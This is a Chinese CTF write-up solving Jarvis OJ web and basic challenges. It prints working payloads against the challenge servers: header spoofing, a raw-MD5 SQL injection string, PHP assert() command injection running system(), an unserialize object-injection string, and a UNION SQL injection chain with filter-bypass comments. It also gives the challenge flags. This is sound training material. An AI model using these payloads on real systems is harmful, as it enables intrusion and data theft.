---
title: jarvisoj-writeup
tags:
---

### WEB

#### localhost

> 题目入口：http://web.jarvisoj.com:32774/

直接访问提示 localhost access only!! ，burp拦截并在请求头添加 *X-Forwarded-For: 127.0.0.1*后放行即可。 

Yeah!! Here's your flag:PCTF{X_F0rw4rd_F0R_is_not_s3cuRe}

#### login

> 需要密码才能获得flag哦。
>
> 题目链接：http://web.jarvisoj.com:32772/

响应头有提示：

```php
Hint:"select * from `admin` where password='".md5($pass,true)."'"
```

最终在数据库执行的是 *select * from   \`admin\`  where password='xxx'* ，其中xxx是哈希处理过的，我们无法直接操控。但是因为 *md5($pass,true)*  返回的是16字节的二进制串(而不是常见的32位十六进制串)，解释成字符串就可能出现`''.join(map(chr,xrange(256)))` 中的任何一个，那么如果十六字节的字符串中能出现`foo'or'1bar` 或是`foo'||'1bar` 这样的形式，即符合 `re.compile("'or'[1-9]|'\|\|'[1-9]", re.I)`  这种pattern的，拼接后就可以绕过比较。平均算起来，大约每`256**5/5/9/(16-5)=2221235611` 也就是22亿个哈希值中可能出现一个我们想要的，我大概7分钟算一亿个，运气好三个小时能算出一个来，然而不想算。别处看到两个 `ffifdyop`和`129581926211651571912466741651878684928` 。

> string **md5**    ( string `$str`   [, bool `$raw_output` = false  ] )
>
> 如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。

```python
import hashlib
import itertools
import string
import re
pool = string.printable
r = re.compile("'or'[1-9]|'\|\|'[0-9]", re.I)
# cnt = 1
with open('res.txt', 'w+') as f:
    for i in xrange(100):
        for j in itertools.product(pool, repeat=i):
            s = hashlib.md5(''.join(j)).digest()
            # cnt += 1
            # f.write(str(cnt)+'\t'+s+'\t'+''.join(j)+'\n')
            # if cnt % 100000000 == 0:
            #     print cnt
            if re.search(r, s):
                f.write(str(cnt)+'\t'+s+'\t'+''.join(j)+'\n')
                print str(cnt)+'\t'+s+'\t'+''.join(j)+'\n'
```

Correct pass!! Your Flag: PCTF{R4w_md5_is_d4ng3rous}

参考：

1. http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes
2. http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/
3. http://blog.csdn.net/greyfreedom/article/details/45846137

#### [61dctf]babyphp

> 题目入口：<http://web.jarvisoj.com:32798/>
>
> Hint1: 此题缺少关键解题文件的问题已修复。

利用Githack发现源码泄露，审查 index.php ，危险函数assert()引起命令执行。

```php
//index.php关键代码
<?php
if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}
$file = "templates/" . $page . ".php";
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
assert("file_exists('$file')") or die("That file doesn't exist!");
?>
```

```php
view-source:http://web.jarvisoj.com:32798/?page=flag'.system('ls -R').'
view-source:http://web.jarvisoj.com:32798/?page=flag'.system('tac templates/flag.php').'
or 
view-source:http://web.jarvisoj.com:32798/?page=flag'.var_dump(scandir('templates/')).'
view-source:http://web.jarvisoj.com:32798/?page=flag'.var_dump(file('templates/flag.php')).'
```

```
//$FLAG = '61dctf{8e_careful_when_us1ng_ass4rt}';
```

> bool **assert**    ( [mixed](mk:@MSITStore:D:\hub\tecBook\技术文档\手册\php_enhanced_zh.chm::/res/language.pseudo-types.html#language.types.mixed) `$assertion`   [, string `$description`  ] )
>
> 如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。

#### [61dctf]admin

> 题目入口：http://web.jarvisoj.com:32792/

访问robots.txt 发现 http://web.jarvisoj.com:32792/admin_s3cr3t.php，访问得到flag{hello guest}并不是flag，在请求头把 admin:0 改为 admin:1 即可得到正确flag   flag{hello_admin~}

#### WEB?

> 这么简单的题，是WEB吗？
>
> 题目入口：http://web.jarvisoj.com:9891/

随意提交，显示`Wrong Password!!` ，在源码底部发现app.js，打开app.js  ctrl+f 搜索`Wrong Password!!` 定位到关键代码。代码大概意思是矩阵o 和我们输入的值相乘得到另一个矩阵r ，那么根据` input=inv(o)*r'` 用matlab一算便得 。

```matlab
核心逻辑：
if(25!==e.length)return!1;
for(var t=[],n=0;n<25;n++)t.push(e.charCodeAt(n));
for(var r=[blabla],o=[blabla],n=0;n<25;n++)
{
	for(var i=0,a=0;a<25;a++)
	i+=t[a]*o[n][a];
	if(i!==r[n])return !1;
}
return !0;

o=[[11,13,32,234,236,3,72,237,122,230,157,53,7,225,193,76,142,166,11,196,194,187,152,132,135],[76,55,38,70,98,244,201,125,182,123,47,86,67,19,145,12,138,149,83,178,255,122,238,187,221],[218,233,17,56,151,28,150,196,79,11,150,128,52,228,189,107,219,87,90,221,45,201,14,106,230],[30,50,76,94,172,61,229,109,216,12,181,231,174,236,159,128,245,52,43,11,207,145,241,196,80],[134,145,36,255,13,239,212,135,85,194,200,50,170,78,51,10,232,132,60,122,117,74,117,250,45],[142,221,121,56,56,120,113,143,77,190,195,133,236,111,144,65,172,74,160,1,143,242,96,70,107],[229,79,167,88,165,38,108,27,75,240,116,178,165,206,156,193,86,57,148,187,161,55,134,24,249],[235,175,235,169,73,125,114,6,142,162,228,157,160,66,28,167,63,41,182,55,189,56,102,31,158],[37,190,169,116,172,66,9,229,188,63,138,111,245,133,22,87,25,26,106,82,211,252,57,66,98],[199,48,58,221,162,57,111,70,227,126,43,143,225,85,224,141,232,141,5,233,69,70,204,155,141],[212,83,219,55,132,5,153,11,0,89,134,201,255,101,22,98,215,139,0,78,165,0,126,48,119],[194,156,10,212,237,112,17,158,225,227,152,121,56,10,238,74,76,66,80,31,73,10,180,45,94],[110,231,82,180,109,209,239,163,30,160,60,190,97,256,141,199,3,30,235,73,225,244,141,123,208],[220,248,136,245,123,82,120,65,68,136,151,173,104,107,172,148,54,218,42,233,57,115,5,50,196],[190,34,140,52,160,34,201,48,214,33,219,183,224,237,157,245,1,134,13,99,212,230,243,236,40],[144,246,73,161,134,112,146,212,121,43,41,174,146,78,235,202,200,90,254,216,113,25,114,232,123],[158,85,116,97,145,21,105,2,256,69,21,152,155,88,11,232,146,238,170,123,135,150,161,249,236],[251,96,103,188,188,8,33,39,237,63,230,128,166,130,141,112,254,234,113,250,1,89,0,135,119],[192,206,73,92,174,130,164,95,21,153,82,254,20,133,56,7,163,48,7,206,51,204,136,180,196],[106,63,252,202,153,6,193,146,88,118,78,58,214,168,68,128,68,35,245,144,102,20,194,207,66],[154,98,219,2,13,65,131,185,27,162,214,63,238,248,38,129,170,180,181,96,165,78,121,55,214],[193,94,107,45,83,56,2,41,58,169,120,58,105,178,58,217,18,93,212,74,18,217,219,89,212],[164,228,5,133,175,164,37,176,94,232,82,0,47,212,107,111,97,153,119,85,147,256,130,248,235],[221,178,50,49,39,215,200,188,105,101,172,133,28,88,83,32,45,13,215,204,141,226,118,233,156],[236,142,87,152,97,134,54,239,49,220,233,216,13,143,145,112,217,194,114,221,150,51,136,31,198]];
r=[325799,309234,317320,327895,298316,301249,330242,289290,273446,337687,258725,267444,373557,322237,344478,362136,331815,315157,299242,305418,313569,269307,338319,306491,351259];
in=inv(o)*r'

得到：
res=''.join(map(chr,[81,87,66,123,82,51,97,99,55,95,49,115,95,105,110,116,101,114,101,115,116,105,110,103,125]))
'QWB{R3ac7_1s_interesting}'
```

#### 神盾局的秘密

> 这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？
>
> 题目入口：http://web.jarvisoj.com:32768/

看到图片地址是 *showimg.php?img=c2hpZWxkLmpwZw==* ，其中img参数的值是 *shield.jpg* 的base64编码，也许可以读文件。读到 showimg.php，index.php，shield.php如下：

```php
//showimg.php
//view-source:http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=
<?php
	$f = $_GET['img'];
	if (!empty($f)) {
		$f = base64_decode($f);
		if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\')===FALSE
		&& stripos($f,'pctf')===FALSE) {
			readfile($f);
		} else {
			echo "File not found!";
		}
	}
?>
```

```php
//index.php
//view-source:http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw
<?php 
	require_once('shield.php');
	$x = new Shield();
	isset($_GET['class']) && $g = $_GET['class'];
	if (!empty($g)) {
		$x = unserialize($g);
	}
	echo $x->readfile();
?>
<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>
```

```php
//shield.php
//view-source:http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==
<?php
	//flag is in pctf.php
	class Shield {
		public $file;
		function __construct($filename = '') {
			$this -> file = $filename;
		}
		
		function readfile() {
			if (!empty($this->file) && stripos($this->file,'..')===FALSE  
			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
				return @file_get_contents($this->file);
			}
		}
	}
?>

```

可以看到 index.php 中传入反序列化函数的是可控的参数，shield.php 提示flag在pctf.php，readfile() 函数又没有过滤，所以构造一下参数即可。

```php
class Shield{
	public $file='pctf.php';
}
var_dump(serialize(new Shield()));
//string(43) "O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}"
//然后访问 
//view-source:http://web.jarvisoj.com:32768/index.php?class=O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}
```

`Ture Flag : PCTF{W3lcome_To_Shi3ld_secret_Ar3a}` 

#### PORT51

> 题目链接：http://web.jarvisoj.com:32770/

要求用51端口访问，指的是用本地的51端口（如果不指定会使用一个随机高端口）。

```shell
[root@yun ~]# curl --local-port 51 http://web.jarvisoj.com:32770/
<!DOCTYPE html>
<html>
<head>
<title>Web 100</title>
<style type="text/css">
	body {
		background:gray;
		text-align:center;
	}
</style>
</head>

<body>
	<h3>Yeah!! Here's your flag:PCTF{M45t3r_oF_CuRl}</h3>	
</body>
</html>

```

`PCTF{M45t3r_oF_CuRl}`

#### IN A Mess

> 连出题人自己都忘了flag放哪了，只记得好像很混乱的样子。
>
> 题目入口：http://web.jarvisoj.com:32780/

源代码提示index.phps，访问发现：

```php
//view-source:http://web.jarvisoj.com:32780/index.phps
<?php
error_reporting(0);
echo "<!--index.phps-->";
if(!$_GET['id'])
{
	header('Location: index.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'Hahahahahaha';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("flag.txt");
}
else
{
	print "work harder!harder!harder!";
}
?>
```

构造`id='null'&b=%00findneo&a=php://input`，然后在hackbar里post`1112 is a nice lab!` 得到`﻿Come ON!!! {/^HT2mCpcvOLf}` （其实id传任意字母都可以）。大括号里的字符串以正斜杆开头，题目说flag放的地方很混乱，都暗示这是url的一部分，访问`http://web.jarvisoj.com:32780//^HT2mCpcvOLf` 自动跳转到`http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1` ，加单引号返回SQL语句，显然是要继续注入。

稍作尝试发现，union、select、from会被删除，用大写即可。空格、%20、`/**/`会被拦截，可以用`/**union/` 、`/union**/` 、  `/*a*/` 混合绕过，猜不到后端怎么写的，挺奇怪。

```sql
二分法确定当前列数为3
view-source:http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1/*a*/order/*a*/by/*a*/3
```

```sql
确定回显列为第三列
view-source:http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1/*a*/and/*a*/0/*a*/UNION/*a*/SELECT/union**/1,2,3
```

```sql
查得当前数据库名为test
view-source:http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1/*a*/and/*a*/0/*a*/UNION/*a*/SELECT/union**/1,2,schema()
```

```sql
查得当前数据库只有一个表，为content
view-source:http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1/*a*/and/*a*/0/*a*/UNION/*a*/SELECT/union**/1,2,group_concat(TABLE_NAME)/**union/FROM/union**/information_schema.tables/*a*/where/*a*/table_schema=schema()
```

```sql
查得当前表有三个字段，为id,context,title
view-source:http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1/*a*/and/*a*/0/*a*/UNION/*a*/SELECT/union**/1,2,group_concat(COLUMN_NAME)/**union/FROM/union**/information_schema.columns/*a*/where/*a*/table_schema=schema()
```

```sql
查得当前表内容： 1+PCTF{Fin4lly_U_got_i7_C0ngRatulation5}+hi666
view-source:http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1/*a*/and/*a*/0/*a*/UNION/*a*/SELECT/union**/1,2,concat_ws(0x2b,id,context,title)/**union/FROM/union**/content
```

`PCTF{Fin4lly_U_got_i7_C0ngRatulation5}` 



### BASIC

#### 关于USS Lab.

> USS的英文全称是什么，请全部小写并使用下划线连接_，并在外面加上PCTF{}之后提交

`PCTF{ubiquitous_system_security}`

#### base64?

> GUYDIMZVGQ2DMN3CGRQTONJXGM3TINLGG42DGMZXGM3TINLGGY4DGNBXGYZTGNLGGY3DGNBWMU3WI===

先base32解码再十六进制转ASCII码

`PCTF{Just_t3st_h4v3_f4n}`

#### veryeasy

> 使用基本命令获取flag
>
> [veryeasy.d944f0e9f8d5fe5b358930023da97d1a](https://dn.jarvisoj.com/challengefiles/veryeasy.d944f0e9f8d5fe5b358930023da97d1a)

搜索字符串。`PCTF{strings_i5_3asy_isnt_i7}`

#### Secret

> 传说中的签到题
>
> 题目入口：http://web.jarvisoj.com:32776/
>
>
> Hint1: 提交格式PCTF{你发现的秘密}

在响应头。`PCTF{Welcome_to_phrackCTF_2016}`

#### 公倍数

> 请计算1000000000以内3或5的倍数之和。
>
> 如：10以内这样的数有3,5,6,9，和是23
>
> 请提交PCTF{你的答案}

 `PCTF{233333333166666668}`

```python
n = 1000000000
def f(a, b):return (b + a / b * b) * (a / b) / 2
print 'PCTF{%s}'%str(f(n, 3) + f(n, 5) - f(n, 15))
```

#### 爱吃培根的出题人

> 听说你也喜欢吃培根？那我们一起来欣赏一段培根的介绍吧：
>
> bacoN is one of aMerICa'S sWEethEartS. it's A dARlinG, SuCCulEnt fOoD tHAt PaIRs FlawLE
>
> 什么，不知道要干什么？上面这段巨丑无比的文字，为什么会有大小写呢？你能发现其中的玄机吗？
>
> 提交格式：PCTF{你发现的玄机}

```python
s = "bacoN is one of aMerICa'S sWEethEartS. it's A dARlinG, SuCCulEnt fOoD tHAt PaIRs FlawLE"
r = ''
for i in s:
    if i.isupper():
        r += 'b'
    if i.islower():
        r += 'a'
print r ## aaaabaaaaaaaabaabbababbaaabaaabaaababbaaabbabbaabaaabababbababbabaaabb
# 第一种方式：
# A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaab
# K ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabb
# U babaa V babab W babba X babbb Y bbaaa Z bbaab
# 第二种方式[v]
# a AAAAA g AABBA 	n ABBAA t BAABA
# b AAAAB h AABBB 	o ABBAB u-v BAABB
# c AAABA i-j ABAAA p ABBBA w BABAA
# d AAABB k ABAAB 	q ABBBB x BABAB
# e AABAA l ABABA 	r BAAAA y BABBA
# f AABAB m ABABB 	s BAAAB z BABBB
```

`PCTF{baconisnotfood}`

